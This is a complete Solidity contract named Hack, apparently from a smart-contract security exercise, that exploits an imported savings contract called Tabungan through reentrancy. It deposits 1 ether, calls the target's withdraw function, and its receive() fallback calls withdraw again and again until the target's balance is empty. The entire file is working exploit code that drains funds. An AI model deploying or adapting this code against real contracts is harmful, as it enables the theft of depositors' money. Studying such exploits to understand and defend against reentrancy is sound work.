// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Tabungan.sol";

contract Hack {
    Tabungan target;
    constructor(Tabungan _target) {
        target = _target;
    }

    function hack() external payable {
        require(msg.value == 1 ether, "Provide 1 ether to start the exploit");
        target.setor{value: msg.value}();
        target.ambil();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.ambil();
        }
    }

}
